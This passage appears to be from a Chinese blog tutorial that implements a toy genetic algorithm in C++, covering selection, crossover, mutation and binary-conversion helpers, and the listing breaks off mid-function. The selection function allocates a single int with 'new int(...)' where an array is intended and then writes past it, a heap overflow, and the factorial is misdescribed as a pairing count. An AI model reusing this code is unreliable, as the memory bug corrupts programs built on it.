<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">1</span> == num)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> num*factorial(num<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是一个简单的排列组合，两两配对最大的组合数目。</p>
<p>在介绍下面的内容我需要先给大家看下我的头文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"targetver.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> num)</span></span>;<span class="comment">//阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x1, <span class="keyword">int</span> x2)</span></span>;<span class="comment">//遗传环境</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitRand</span><span class="params">()</span></span>;<span class="comment">//初始化随机种子</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randRange</span><span class="params">(<span class="keyword">int</span> Imin,<span class="keyword">int</span> Imax)</span></span>;<span class="comment">//有范围的随机函数</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">decimalToBinary</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;<span class="comment">//十进制转二进制</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decimalToBinaryLength</span><span class="params">(<span class="keyword">int</span> num)</span></span>;<span class="comment">//十进制转二进制，二进制的长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinStr2Dec</span><span class="params">(<span class="built_in">string</span> bin)</span></span>;<span class="comment">//二进制转十进制</span></span><br><span class="line"><span class="function"><span class="built_in">string</span>* <span class="title">inheritance</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;<span class="comment">//交叉遗传 ，第二个参数是总个数，这个函数会将传进来的string数组释放</span></span><br><span class="line"><span class="function"><span class="built_in">string</span>* <span class="title">variation</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;<span class="comment">//变异，和遗传类似</span></span><br><span class="line"><span class="function"><span class="built_in">string</span>* <span class="title">choose</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;<span class="comment">//选择，和遗传类似</span></span><br></pre></td></tr></table></figure>

<p>比较关键的就是最后三个函数，前面的函数看名字就知道了。<br>那么我具体是怎么模仿生物界的遗传变异选择的呢？这个是关键点。<br>首先我们要知道动物交配一般来说是需要一公一母的，所以我们要从所有的各种（<code>int ALLindividual[8] = {0,1,2,3,4,5,6,7};</code>）中随机选出几组第一代生物：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> realnum = <span class="number">4</span>;<span class="comment">//这个后面要进行rand取操作</span></span><br><span class="line"><span class="keyword">int</span> ** individual  = <span class="keyword">new</span> <span class="keyword">int</span>*[realnum];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;realnum;j++)</span><br><span class="line">	individual[j] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;realnum;i++)</span><br><span class="line">&#123;</span><br><span class="line">	individual[i][<span class="number">0</span>] = ALLindividual[randRange(<span class="number">0</span>,<span class="built_in">size</span><span class="number">-1</span>)];</span><br><span class="line">	individual[i][<span class="number">1</span>] = ALLindividual[randRange(<span class="number">0</span>,<span class="built_in">size</span><span class="number">-1</span>)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了简单的介绍遗传变异算法，我就不用rand进行获取了，当然我们在使用rand前为了真正的随机，我们需要先给他一个种子<code>InitRand</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitRand</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用时间算是比较好的了，但是注意，这个只需要一次就好了，要不会出问题的！<br>大家可能会发现我用了一个randRange函数，他是用来获取范围的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randRange</span><span class="params">(<span class="keyword">int</span> Imin,<span class="keyword">int</span> Imax)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> rand()%(Imax+<span class="number">1</span>-Imin)+Imin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是随机从我们的总个体中选出一个个体。为什么是二维数组，因为我直接给他配对了。<br>得到了类似于：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[1,3]</span><br><span class="line">[2,4]</span><br><span class="line">[6,1]</span><br><span class="line">[5,7]</span><br></pre></td></tr></table></figure>
<p>这样子的一个数组，这就是我们第一代的个体，接下来要让他们。<br>接下来就是我们的算法了，为了让我们的染色体足够长，方便我们的交配变异，那么我们就需要一个算法去将我们的父辈个体进行编码，可以使用ASCII或者其他的，但是为了简单我就用了二进制：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> StringSize = decimalToBinaryLength(ALLindividual[<span class="built_in">size</span><span class="number">-1</span>]);<span class="comment">//补足长度</span></span><br><span class="line"><span class="built_in">string</span> *strarr = <span class="keyword">new</span> <span class="built_in">string</span>[realnum];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;realnum;i++)</span><br><span class="line">	strarr[i] = decimalToBinary(individual[i][<span class="number">0</span>],StringSize)+decimalToBinary(individual[i][<span class="number">1</span>],StringSize);</span><br><span class="line"><span class="comment">//当用string得到了随机的数组，就释放掉</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;realnum;j++)</span><br><span class="line">	<span class="keyword">delete</span>[] individual[j];</span><br><span class="line"><span class="keyword">delete</span> [] individual;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"第1代"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;realnum;i++)</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;strarr[i]&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<p>可以看到，首先我们先测量了最大的数值的二进制长度（0111，长度就是4，因为我们要统一），然后我们就用一个string类型的数组记录我们四组的交配的染色体，然后保证内存足够的小（我们可能需要繁衍几万代，所以每一个内存我都处理的很小心），我就尽量将没有用的内存全部delete掉。<br>得到第一代的染色体了，我们就可以进入生物界了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> CurrentNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//cout&lt;&lt;"选择"&lt;&lt;endl;</span></span><br><span class="line">	strarr = choose(strarr,realnum);</span><br><span class="line">	<span class="comment">/*for (int i = 0;i&lt;realnum;i++)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		cout &lt;&lt;strarr[i]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout&lt;&lt;"交叉遗传"&lt;&lt;endl;</span></span><br><span class="line">	strarr = inheritance(strarr,realnum);</span><br><span class="line">	<span class="comment">/*for (int i = 0;i&lt;realnum;i++)</span></span><br><span class="line"><span class="comment">	&#123;</span></span><br><span class="line"><span class="comment">		cout &lt;&lt;strarr[i]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line">	<span class="comment">//cout&lt;&lt;"变异"&lt;&lt;endl;</span></span><br><span class="line">	CurrentNum++;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"第"</span>&lt;&lt;CurrentNum&lt;&lt;<span class="string">"代"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	strarr = variation(strarr,realnum);</span><br><span class="line">	<span class="keyword">int</span> tempCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;realnum;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		tempCount+=BinStr2Dec(strarr[i]);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt;strarr[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//测试用的当结果比较满足就跳出循环</span></span><br><span class="line">	<span class="keyword">if</span> (tempCount == <span class="number">252</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;tempCount&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	Sleep(<span class="number">60</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> [] strarr;</span><br></pre></td></tr></table></figure>
<p>首先我们先进行选择，然后得到选择后的个体进行交叉遗传，然后再进行变异，然后判断满不满足情况（这个情况只是我为了查看效果写的，其实我们可以直接看出来，x1和x2越来越大肯定更适合，真实环境不是这样子的），简单的逻辑知道了，那么我们就要看：</p>
<ol>
<li>choose（选择）</li>
<li>inheritance(交叉遗传)</li>
<li>variation(变异)</li>
</ol>
<p>这三个比较关键的函数了。</p>
<h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="built_in">string</span>* <span class="title">choose</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> *tmpstrarr = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="built_in">size</span>];</span><br><span class="line">	<span class="keyword">int</span> *chooseData = <span class="keyword">new</span> <span class="keyword">int</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="built_in">size</span>);</span><br><span class="line">	<span class="built_in">memset</span>(chooseData,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="built_in">size</span>);</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//分配</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> x1 = BinStr2Dec(strarr[i].substr(<span class="number">0</span>,strarr[i].length()/<span class="number">2</span>));</span><br><span class="line">		<span class="keyword">int</span> x2 = BinStr2Dec(strarr[i].substr(strarr[i].length()/<span class="number">2</span>,strarr[i].length()/<span class="number">2</span>));</span><br><span class="line">		<span class="keyword">int</span> res = f(x1,x2);</span><br><span class="line">		chooseData[i] = res;</span><br><span class="line">		count+=res;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//进行选择</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> pos = randRange(<span class="number">1</span>,count);</span><br><span class="line">		<span class="keyword">int</span> tmpCount = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="built_in">size</span>;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			tmpCount+=chooseData[j];</span><br><span class="line">			<span class="keyword">if</span> (pos&lt;=tmpCount)</span><br><span class="line">			&#123;</span><br><span class="line">				tmpstrarr[i] = strarr[j];</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span>[] strarr;</span><br><span class="line">	<span class="keyword">return</span> tmpstrarr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我这里用了inline，因为提高速度，传进来的第一个参数是我们要选择的染色体，因为我们染色体生成方法是将两个数组进行二进制转换拼接起来。<br>我们先将染色体还原，得到真正的个体，将个体传递给环境选择函数，每个染色体都对应出来了一个环境适应值。我们相加所有的环境适应值，然后再继续用随机选择函数，选择原先染色体的个数（保证种群不会被淘汰），算法不难理解，就是看随机数属于哪个个体适应值的范围，如果在这个范围内的话呢，我们就选择出来对应的个体。</p>
<p>能得到对于适应函数更适合的染色体序列，然后返回回去，注意原先的数组要清除（我发现直接赋值会有问题）</p>
<h3 id="遗传"><a href="#遗传" class="headerlink" title="遗传"></a>遗传</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="built_in">string</span>* <span class="title">inheritance</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> *tmpstrarr = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="built_in">size</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;(<span class="built_in">size</span>/<span class="number">2</span>);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> index=(<span class="number">2</span>*i);<span class="comment">//当前的下标</span></span><br><span class="line">		<span class="keyword">int</span> pos = randRange(<span class="number">0</span>,strarr[index].length()<span class="number">-1</span>);<span class="comment">//取出遗传的位置</span></span><br><span class="line">		tmpstrarr[index] = strarr[index].substr(<span class="number">0</span>,pos)+strarr[index+<span class="number">1</span>].substr(pos,strarr[index].length()-pos);</span><br><span class="line">		tmpstrarr[index+<span class="number">1</span>] = strarr[index+<span class="number">1</span>].substr(<span class="number">0</span>,pos)+strarr[index].substr(pos,strarr[index+<span class="number">1</span>].length()-pos);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span>[] strarr;</span><br><span class="line">	<span class="keyword">return</span> tmpstrarr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>遗传我们是讲染色体两两配对，交换部分染色体的位置，其实也就是取出一个0到染色体的长度的随机数，从这个随机数进行染色体分割，交换对应的内容，得到两个交换染色体之后的个体，然后循环生成新的个体（所以我们的个体最好选择偶数，所以在选择随机个体数的时候最好使用/2*2这样得到偶数）。</p>
<h3 id="变异"><a href="#变异" class="headerlink" title="变异"></a>变异</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="built_in">string</span>* <span class="title">variation</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> *tmpstrarr = <span class="keyword">new</span> <span class="built_in">string</span>[<span class="built_in">size</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> pos = randRange(<span class="number">0</span>,strarr[i].length()<span class="number">-1</span>);<span class="comment">//取出遗传的位置</span></span><br><span class="line">		<span class="built_in">string</span> tmppos = strarr[i].substr(pos,<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (tmppos == <span class="string">"0"</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			tmpstrarr[i] = strarr[i].substr(<span class="number">0</span>,pos)+<span class="string">"1"</span>+strarr[i].substr(pos+<span class="number">1</span>,strarr[i].length()-pos<span class="number">-1</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			tmpstrarr[i] = strarr[i].substr(<span class="number">0</span>,pos)+<span class="string">"0"</span>+strarr[i].substr(pos+<span class="number">1</span>,strarr[i].length()-pos<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">delete</span>[] strarr;</span><br><span class="line">	<span class="keyword">return</span> tmpstrarr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>变异就是将染色体的某个位置的值进行0与1的互换，然后得到新的染色体，返回给生物界环境。</p>
<h4 id="其他辅助函数"><a href="#其他辅助函数" class="headerlink" title="其他辅助函数"></a>其他辅助函数</h4><p>可能大家在其他编程的时候会用到这些函数，发出来希望能帮助到大家</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decimalToBinaryLength</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> a=num;a;a=a/<span class="number">2</span>)</span><br><span class="line">		i++;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">decimalToBinary</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> s=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> a=num;a;a=a/<span class="number">2</span>)</span><br><span class="line">		s=(a%<span class="number">2</span>?<span class="string">'1'</span>:<span class="string">'0'</span>)+s;<span class="comment">//不断进行相除</span></span><br><span class="line">	<span class="keyword">while</span>(s.length()&lt;<span class="built_in">size</span>)</span><br><span class="line">		s=<span class="string">'0'</span>+s;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinStr2Dec</span><span class="params">(<span class="built_in">string</span> bin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">size</span> = bin.length();</span><br><span class="line">	<span class="comment">//将二进制数字转换为十进制</span></span><br><span class="line">	<span class="keyword">int</span> parseBinary = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">size</span>; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (bin.substr(i,<span class="number">1</span>) == <span class="string">"1"</span>) &#123;</span><br><span class="line">			parseBinary += <span class="built_in">pow</span>(<span class="number">2.0</span>, <span class="built_in">size</span> - i - <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> parseBinary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进制转换的函数。</p>
<h3 id="完成代码："><a href="#完成代码：" class="headerlink" title="完成代码："></a>完成代码：</h3><p>头文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"targetver.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> num)</span></span>;<span class="comment">//阶乘</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x1, <span class="keyword">int</span> x2)</span></span>;<span class="comment">//遗传环境</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitRand</span><span class="params">()</span></span>;<span class="comment">//初始化随机种子</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randRange</span><span class="params">(<span class="keyword">int</span> Imin,<span class="keyword">int</span> Imax)</span></span>;<span class="comment">//有范围的随机函数</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">decimalToBinary</span><span class="params">(<span class="keyword">int</span> num,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;<span class="comment">//十进制转二进制</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decimalToBinaryLength</span><span class="params">(<span class="keyword">int</span> num)</span></span>;<span class="comment">//十进制转二进制，二进制的长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BinStr2Dec</span><span class="params">(<span class="built_in">string</span> bin)</span></span>;<span class="comment">//二进制转十进制</span></span><br><span class="line"><span class="function"><span class="built_in">string</span>* <span class="title">inheritance</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;<span class="comment">//交叉遗传 ，第二个参数是总个数，这个函数会将传进来的string数组释放</span></span><br><span class="line"><span class="function"><span class="built_in">string</span>* <span class="title">variation</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;<span class="comment">//变异，和遗传类似</span></span><br><span class="line"><span class="function"><span class="built_in">string</span>* <span class="title">choose</span><span class="params">(<span class="built_in">string</span>* strarr,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;<span class="comment">//选择，和遗传类似</span></span><br></pre></td></tr></table></figure>
<p>cpp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	InitRand();<span class="comment">//初始化随机种子</span></span><br><span class="line">	<span class="keyword">int</span> <span class="built_in">size</span> = <span class="number">8</span>;<span class="comment">//总共可以选择的个体数</span></span><br><span class="line">	<span class="keyword">int</span> allnum = factorial(<span class="built_in">size</span>);<span class="comment">//两两配对最大个数</span></span><br><span class="line">	<span class="keyword">int</span> ALLindividual[<span class="number">8</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> realnum = <span class="number">4</span>;<span class="comment">//这个后面要进行rand取操作</span></span><br><span class="line">	<span class="keyword">int</span> ** individual  = <span class="keyword">new</span> <span class="keyword">int</span>*[realnum];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;realnum;j++)</span><br><span class="line">		individual[j] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;realnum;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		individual[i][<span class="number">0</span>] = ALLindividual[randRange(<span class="number">0</span>,<span class="built_in">size</span><span class="number">-1</span>)];</span><br><span class="line">		individual[i][<span class="number">1</span>] = ALLindividual[randRange(<span class="number">0</span>,<span class="built_in">size</span><span class="number">-1</span>)];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> StringSize = decimalToBinaryLength(ALLindividual[<span class="built_in">size</span><span class="number">-1</span>]);<span class="comment">//补足长度</span></span><br><span class="line">	<span class="built_in">string</span> *strarr = <span class="keyword">new</span> <span class="built_in">string</span>[realnum];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;realnum;i++)</span><br><span class="line">		strarr[i] = decimalToBinary(individual[i][<span class="number">0</span>],StringSize)+decimalToBinary(individual[i][<span class="number">1</span>],StringSize);</span><br><span class="line">	<span class="comment">//当用string得到了随机的数组，就释放掉</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;realnum;j++)</span><br><span class="line">		<span class="keyword">delete</span>[] individual[j];</span><br><span class="line">	<span class="keyword">delete</span> [] individual;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"第1代"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;realnum;i++)</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt;strarr[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">int</span> CurrentNum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//cout&lt;&lt;"选择"&lt;&lt;endl;</span></span><br><span class="line">		strarr = choose(strarr,realnum);</span><br><span class="line">		<span class="comment">/*for (int i = 0;i&lt;realnum;i++)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			cout &lt;&lt;strarr[i]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//cout&lt;&lt;"交叉遗传"&lt;&lt;endl;</span></span><br><span class="line">		strarr = inheritance(strarr,realnum);</span><br><span class="line">		<span class="comment">/*for (int i = 0;i&lt;realnum;i++)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			cout &lt;&lt;strarr[i]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		<span class="comment">//cout&lt;&lt;"变异"&lt;&lt;endl;</span></span><br><span class="line">		CurrentNum++;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"第"</span>&lt;&lt;CurrentNum&lt;&lt;<span class="string">"代"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		strarr = variation(strarr,realnum);</span><br><span class="line">		<span class="keyword">int</span> tempCount = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;realnum;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			tempCount+=BinStr2Dec(strarr[i]);</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt;strarr[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//测试用的当结果比较满足就跳出循环</span></span><br><span class="line">		<span class="keyword">if</span> (tempCount == <span class="number">252</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;tempCount&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Sleep(<span class="number">60</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">delete</span> [] strarr;</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="built_in">string</span>* <span class="title">inheritance</span><span 